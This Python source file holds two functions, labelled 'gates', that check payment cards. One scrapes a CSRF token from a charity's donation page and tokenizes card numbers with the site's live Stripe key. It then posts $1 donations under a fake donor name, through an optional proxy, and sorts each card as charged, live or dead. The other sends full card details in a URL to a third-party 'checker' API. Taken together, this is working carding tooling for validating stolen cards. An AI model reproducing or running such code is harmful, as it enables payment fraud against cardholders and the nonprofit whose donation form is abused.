
import aiohttp
import re
import random
from urllib.parse import quote

# -------------------------------------------------------------
# STRIPE HEARTCRY CHECKER (SimpleDonation Gate)
# -------------------------------------------------------------
async def check_stripe_heartcry(card, month, year, cvv, proxy=None):
    """
    Stripe Donation Charge Gate (HeartCry)
    Uses pk_live_yZsZ8CnKR62sWJPaT97tC5Bp
    Charges $1
    """
    try:
        if len(year) == 2: year = "20" + year
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        headers = {"User-Agent": ua}
        
        async with aiohttp.ClientSession() as session:
            # 1. Get Authenticity Token
            try:
                async with session.get("https://heartcry.simpledonation.com/", headers=headers, proxy=proxy, timeout=30) as resp:
                    if resp.status != 200:
                        return {"status": "error", "response": f"Site Down ({resp.status})", "gate": "HeartCry"}
                    text = await resp.text()
            except Exception as e:
                err = str(e)
                if "name resolution" in err.lower() or "cannot connect" in err.lower():
                     return {"status": "error", "response": "Connection/Proxy Error ❌", "gate": "HeartCry"}
                return {"status": "error", "response": f"Connection Failed: {err[:50]}", "gate": "HeartCry"}
                
            # Extract CSRF token
            csrf = re.search(r'name="authenticity_token" value="([^"]+)"', text)
            if not csrf:
                return {"status": "error", "response": "Failed to get CSRF token", "gate": "HeartCry"}
            csrf_token = csrf.group(1)

            # 2. Tokenize Card via Stripe API (v2)
            # SimpleDonation uses older Stripe.js, likely uses tokens endpoint
            
            stripe_pk = "pk_live_yZsZ8CnKR62sWJPaT97tC5Bp"
            token_url = "https://api.stripe.com/v1/tokens"
            token_headers = {
                 "Authorization": f"Bearer {stripe_pk}",
                 "Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": ua
            }
            token_data = {
                "card[number]": card,
                "card[exp_month]": month,
                "card[exp_year]": year,
                "card[cvc]": cvv,
                "guid": "NA",
                "muid": "NA",
                "sid": "NA",
                "payment_user_agent": "stripe.js/5292415; stripe-js-v2/5292415",
                "time_on_page": "12345",
                "key": stripe_pk
            }
            
            try:
                async with session.post(token_url, data=token_data, headers=token_headers, proxy=proxy, timeout=20) as resp_tok:
                    tok_res = await resp_tok.json()
                    
                    if "error" in tok_res:
                        err = tok_res["error"]["message"]
                        return {"status": "dead", "response": err, "gate": "HeartCry (Token)"}
                    
                    stripe_token = tok_res["id"]
            except Exception as e:
                 return {"status": "error", "response": f"Tokenization Failed: {str(e)[:50]}", "gate": "HeartCry"}

            # 3. Submit Donation ($1)
            # Based on form fields observed
            donate_url = "https://heartcry.simpledonation.com/donors"
            
            payload = {
                "authenticity_token": csrf_token,
                "utf8": "✓",
                "recurring": "false",
                "donation[amount]": "1.00",
                "donation[fund_id]": "1", # Guessing fund ID or generic
                # Actually, simpledonation usually submits structured data
                # Let's try to mimic standard simpledonation post
                "customer[first_name]": "James",
                "customer[last_name]": "Doe",
                "customer[email]": f"jamesdoe{random.randint(1000,9999)}@gmail.com",
                "customer[payment_sources][gateway]": "stripe",
                "customer[payment_sources][token]": stripe_token,
                "commit": "Click to confirm gift of $1.00"
            }
            
            try:
                async with session.post(donate_url, data=payload, headers=headers, proxy=proxy, timeout=30) as resp_charge:
                    text_charge = await resp_charge.text()
                    
                    if "Thank you" in text_charge or "success" in text_charge.lower():
                         return {"status": "charged", "amount": "$1.00", "response": "Donation Successful 🔥", "gate": "HeartCry"}
                    
                    if "insufficient" in text_charge.lower():
                         return {"status": "live", "response": "Insufficient Funds ✅", "gate": "HeartCry"}
                    
                    return {"status": "dead", "response": "Declined", "gate": "HeartCry"}
            except Exception as e:
                 return {"status": "error", "response": f"Charge Failed: {str(e)[:50]}", "gate": "HeartCry"}
                
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "HeartCry"}


# -------------------------------------------------------------
# STRIPE VERCEL API CHECKER
# -------------------------------------------------------------
async def check_stripe_vercel(card, month, year, cvv, proxy=None):
    """
    Stripe Vercel API Checker
    URL: https://st-charge-1.vercel.app/check?gateway=St_Charge_1$&key=AloneOp&cc={cc}|{mes}|{ano}|{cvv}
    """
    try:
        url = f"https://st-charge-1.vercel.app/check?gateway=St_Charge_1$&key=AloneOp&cc={card}|{month}|{year}|{cvv}"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=60) as resp:
                text = await resp.text()
                
                try:
                    res_json = await resp.json()
                except:
                    res_json = {}
                
                status = res_json.get("Status", "").lower()
                response = res_json.get("Response", "")
                
                try:
                    full_resp = (response + " " + status).strip()
                except:
                    full_resp = text
                
                if "charged" in full_resp.lower() or "success" in full_resp.lower() or "approved" in full_resp.lower():
                     return {"status": "charged", "amount": "$1.00", "response": "Charged/Auth Success (Vercel) 🔥", "gate": "Stripe Vercel"}
                
                if "insufficient" in full_resp.lower():
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Stripe Vercel"}
                
                if "security code" in full_resp.lower() or "cvv" in full_resp.lower():
                     return {"status": "live", "response": "CVV Mismatch (Live) ✅", "gate": "Stripe Vercel"}

                # Check for "Deployment not found" or 404 text
                if "deployment could not be found" in text.lower():
                     return {"status": "error", "response": "API Endpoint Dead (404)", "gate": "Stripe Vercel"}

                return {"status": "dead", "response": full_resp or "Declined", "gate": "Stripe Vercel"}

    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Stripe Vercel"}
